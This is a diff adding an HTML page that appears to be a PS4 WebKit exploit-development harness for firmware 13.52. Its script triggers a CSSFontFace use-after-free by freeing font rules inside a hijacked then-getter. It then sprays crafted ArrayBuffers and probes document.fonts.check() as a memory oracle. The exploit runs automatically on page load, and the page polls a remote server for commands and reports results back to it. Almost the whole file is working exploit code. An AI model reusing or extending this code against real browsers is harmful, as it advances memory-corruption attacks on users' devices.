@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>PS4 Browser Agent v21 - check() Oracle Probe</title></head>
+<body>
+<h2>PS4 Browser Agent v21 - check() oracle probe (FW 13.52 / 616)</h2>
+<div id="ver">v21 (stage2_check_oracle - coherent flow)</div>
+<div id="status">Connecting...</div>
+<div id="log"></div>
+<script>
+var SERVER = 'http://192.168.100.2:8080';
+var el = document.getElementById('log');
+var statusEl = document.getElementById('status');
+
+function log(m) {
+    var d = document.createElement('div');
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+}
+function sendResult(tag, data) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/result?tag=' + encodeURIComponent(tag) + '&r=' + encodeURIComponent(String(data)), false);
+        x.send();
+        log('SENT [' + tag + ']: ' + String(data).substring(0, 120));
+    } catch(e) { log('SEND ERROR: ' + e); }
+}
+function sendLog(m) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/log?m=' + encodeURIComponent(m), false);
+        x.send();
+    } catch(e) {}
+}
+function poll() {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/poll', false);
+        x.send();
+        var resp = x.responseText;
+        if (resp && resp !== 'null') { return JSON.parse(resp); }
+    } catch(e) { log('Poll error: ' + e); }
+    return null;
+}
+
+// 616 CSSFontFace layout (source-derived; FINDINGS Session 3 + commons notes)
+//   m_families@0x20, m_ranges@0x28 = Vector<UnicodeRange>{buf(8)@0x28,cap u32@0x30,size u32@0x34},
+//   m_sources@0x50, m_clients@0x60, m_wrapper@0x70, m_fontSelectionCapabilities@0x78, m_status(8)@0xa8
+var O_FAMILIES  = 0x20;
+var O_RANGESBUF = 0x28;
+var O_RANGESCAP = 0x30;
+var O_RANGESSZ  = 0x34;
+var O_STATUS    = 0xa8;
+
+var commands = {
+    'info': function() {
+        return JSON.stringify({ ua: navigator.userAgent, fonts: (typeof FontFace !== 'undefined'), check: (document.fonts ? typeof document.fonts.check : 'nofonts') });
+    },
+
+    // =====================================================================
+    // STAGE 2A - check() oracle reachability, wedge-free.
+    //
+    // Mechanics (proven v17-v20 + 616 source):
+    //   * Family 'b' rule-backed font B is freed by deleteRule while CSSFontFaceSet
+    //     still holds it in m_facesLookupTable (stale Ref<CSSFontFace>).
+    //   * The deleteRule MUST be timed inside the load() microtask (then-getter on A)
+    //     so the free happens while load()'s matching snapshot holds B.
+    //   * If the fake's m_status=Failure(4), load() takes the REJECT branch at
+    //     FontFaceSet::load() and NEVER calls wrapper() -> NO WEDGE, page survives.
+    //   * document.fonts.check() runs matchingFacesExcludingPreinstalledFonts ->
+    //     rangesMatchCodePoint() on the stale table's face = our reclaimed fake.
+    //     check() never touches wrapper()/variant -> oracle is safe AND wedge-free.
+    //   * With m_ranges.size=0, rangesMatchCodePoint() short-circuits isEmpty()==true
+    //     (no deref of buffer) -> matches ANY code point -> no crash.
+    // Signal: post-UAF check('1em b', ch)=true (control 'zz-nosuch'=false) proves the
+    //         matching loop reads the reclaimed fake. c0 pre-UAF = baseline.
+    // =====================================================================
+    'stage2_check_oracle': function(statusHex) {
+        return new Promise(function(resolve) {
+            var out = [];
+            function push(m) { out.push(m); sendLog('2A: ' + m); }
+            var done = false;
+            function finish() { if (!done) { done = true; clearTimeout(timer); resolve(out.join('\n')); } }
+            var timer = setTimeout(finish, 60000);
+
+            (async function() {
+                try {
+                    var status = (statusHex === undefined || statusHex === null) ? 4 : parseInt(statusHex, 16);
+                    push('== STAGE 2A check() oracle, fake m_status=0x' + status.toString(16) + ' ==');
+
+                    var spray_count = 0x80;
+                    var spray_font_rule = '@font-face{font-family:spray;src:local(Helvetica Bold);unicode-range:U+0043;}';
+                    var uaf_font_rule   = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
+                    var abs = [];
+                    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                    document.fonts.add(A);
+                    void A.loaded;
+                    var style = document.createElement('style');
+                    document.head.appendChild(style);
+                    var n, uaf_idx;
+                    for (n = 0; n < spray_count / 4; n++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                    uaf_idx = style.sheet.cssRules.length;
+                    style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+                    for (n = spray_count / 4; n < spray_count; n++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                    try { document.body.offsetTop; } catch(e) {}
+                    push('rules set: uaf_idx=' + uaf_idx + ' cssRules=' + style.sheet.cssRules.length);
+
+                    function tryCheck(fam, ch) {
+                        var res;
+                        try { res = document.fonts.check(fam, ch); } catch(e) { res = 'ERR:' + (e && e.message || e); }
+                        return res;
+                    }
+                    var c0b = tryCheck('1em b, spray', 'B');
+                    var c0s = tryCheck('1em b, spray', 'C');
+                    push('BASELINE (pre-UAF): check(1em b,spray,B)=' + c0b + ' check(1em b,spray,C)=' + c0s);
+
+                    // ---- install then-getter: free B + spray craft, THEN load() triggers it ----
+                    var old_then = FontFace.prototype.then;   // may be undefined
+                    Object.defineProperty(FontFace.prototype, 'then', {
+                        configurable: true,
+                        get: function() {
+                            if (this === A) {
+                                push('THEN on A: freeing B + spraying');
+                                for (n = 0; n < style.sheet.cssRules.length; n++) {
+                                    if (n !== uaf_idx) { try { style.sheet.deleteRule(n); } catch(e) {} }
+                                }
+                                try { document.body.offsetTop; } catch(e) {}
+                                try { style.sheet.deleteRule(uaf_idx); } catch(e) {}
+                                try { document.body.offsetTop; } catch(e) {}
+                                for (n = 0; n < spray_count; n++) {
+                                    var ab = new ArrayBuffer(0x100);
+                                    var dv = new DataView(ab);
+                                    dv.setBigUint64(O_FAMILIES, 0n, true);
+                                    dv.setBigUint64(O_RANGESBUF, 0n, true);
+                                    dv.setUint32(O_RANGESCAP, 0, true);
+                                    dv.setUint32(O_RANGESSZ, 0, true);   // size=0 -> isEmpty -> no deref, matches any
+                                    dv.setUint8(O_STATUS, status, true); // Failure -> load rejects before wrapper()
+                                    dv.setBigUint64(8, 1n, true);       // refcount preset
+                                    abs.push(ab);
+                                }
+                                push('  sprayed ' + abs.length + ' AB(0x100), status=0x' + status.toString(16));
+                            }
+                            return undefined;
+                        }
+                    });
+
+                    // ---- load() to fire the getter; fake status=Failure => REJECT, never wrapper() => no wedge ----
+                    var loadRes,
+                        p;
+                    try {
+                        p = document.fonts.load('1em a, b', 'AB');
+                    } catch(e) {
+                        loadRes = 'load THREW: ' + e;
+                        push(loadRes);
+                    }
+                    if (p) {
+                        p.then(
+                            function(v) { push('load RESOLVED (unexpected, len=' + v.length + ')'); },
+                            function(re) { push('load REJECTED (EXPECTED via Failure status): ' + re); }
+                        );
+                    }
+                    try { Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then }); } catch(e) {}
+                    await new Promise(function(r){ setTimeout(r, 2000); });
+
+                    // ---- NOW pure check() probes (no wrapper() in this path) ----
+                    push('-- post-UAF check() oracle probes --');
+                    var probes = ['A', 'B', 'C', '\u0100', 'z'];
+                    for (var pi = 0; pi < probes.length; pi++) {
+                        var ch = probes[pi];
+                        var res = tryCheck('1em b, spray', ch);
+                        push('check(1em b,spray,' + ch + ') = ' + res);
+                    }
+                    var cCtrl = tryCheck('1em zz-nosuch', 'A');
+                    push('control check(1em zz-nosuch, A) = ' + cCtrl);
+                    push('document.fonts.size = ' + document.fonts.size);
+
+                    // ---- scan sprayed ABs for any WebKit write (identifies the reclaimed fake) ----
+                    var bump = [];
+                    for (var zi = 0; zi < abs.length; zi++) {
+                        try {
+                            var dvz = new DataView(abs[zi]);
+                            var f = dvz.getBigUint64(O_FAMILIES, true);
+                            var rb = dvz.getBigUint64(O_RANGESBUF, true);
+                            var ss = dvz.getUint32(O_RANGESSZ, true);
+                            var st = dvz.getUint8(O_STATUS, true);
+                            var rf = dvz.getBigUint64(8, true);
+                            if (f !== 0n || rb !== 0n || ss !== 0 || st !== status || rf !== 1n) {
+                                bump.push('ab[' + zi + '] fam=' + f.toString(16) + ' rbuf=' + rb.toString(16) + ' rsz=' + ss + ' st=' + st + ' ref=' + rf.toString(16));
+                            }
+                        } catch(e) {}
+                    }
+                    push('changed-after-probes buffers: ' + bump.length);
+                    for (var bi = 0; bi < bump.length && bi < 20; bi++) push('  ' + bump[bi]);
+
+                    push('== STAGE 2A DONE ==');
+                } catch(e) {
+                    push('FATAL: ' + e + (e && e.stack ? ' | ' + e.stack : ''));
+                } finally {
+                    clearTimeout(timer);
+                    finish();
+                }
+            })();
+        });
+    }
+};
+
+log('PS4 Browser Agent v21 started');
+function mainLoop() {
+    try {
+        var cmd = poll();
+        if (cmd && cmd.action) {
+            log('CMD: ' + cmd.action + (cmd.args ? ' ' + JSON.stringify(cmd.args) : ''));
+            if (commands[cmd.action]) {
+                try {
+                    var result = commands[cmd.action].apply(null, cmd.args || []);
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(val) {
+                            sendResult(cmd.action, val);
+                        }).catch(function(e) {
+                            sendResult(cmd.action, 'PROMISE REJECT: ' + (e && e.stack || e));
+                        });
+                    } else {
+                        sendResult(cmd.action, result);
+                    }
+                } catch(e) {
+                    sendResult(cmd.action, 'THROW: ' + (e && e.stack || e));
+                    log('COMMAND THROW: ' + e);
+                }
+            } else {
+                sendResult(cmd.action, 'UNKNOWN COMMAND: ' + cmd.action);
+            }
+        }
+    } catch(e) { log('LOOP ERROR: ' + e); }
+    statusEl.textContent = 'Active | ' + new Date().toLocaleTimeString();
+    setTimeout(mainLoop, 500);
+}
+mainLoop();
+
+// ===== AUTO-RUN: probe fires automatically right after page load =====
+function autoStart() {
+    log('AUTO: starting stage2_check_oracle (m_status=Failure)');
+    try {
+        var result = commands['stage2_check_oracle'](4);
+        if (result && typeof result.then === 'function') {
+            result.then(function(val) {
+                sendResult('stage2_check_oracle', val);
+            }).catch(function(e) {
+                sendResult('stage2_check_oracle', 'PROMISE REJECT: ' + (e && e.stack || e));
+            });
+        } else {
+            sendResult('stage2_check_oracle', result);
+        }
+    } catch(e) {
+        sendResult('stage2_check_oracle', 'THROW: ' + (e && e.stack || e));
+    }
+}
+setTimeout(function() {
+    try { if (document.fonts && document.fonts.ready) { document.fonts.ready.then(function(){ setTimeout(autoStart, 300); }); } else { autoStart(); } }
+    catch(e) { autoStart(); }
+}, 1000);
+// ===============================================================
+
+var TOKEN = Math.random().toString(36).slice(2, 10);
+sendLog('PAGE:new:v21:' + TOKEN);
+try {
+    var hb = new Worker(URL.createObjectURL(new Blob([
+        'var t="' + TOKEN + '";' +
+        'setInterval(function(){var x=new XMLHttpRequest();' +
+        'x.open("GET","' + SERVER + '/log?m=BEAT:"+t,false);x.send();},2000);'
+    ], { type: 'application/javascript' })));
+} catch(e) { log('hb fail: ' + e); }
+</script>
+</body></html>
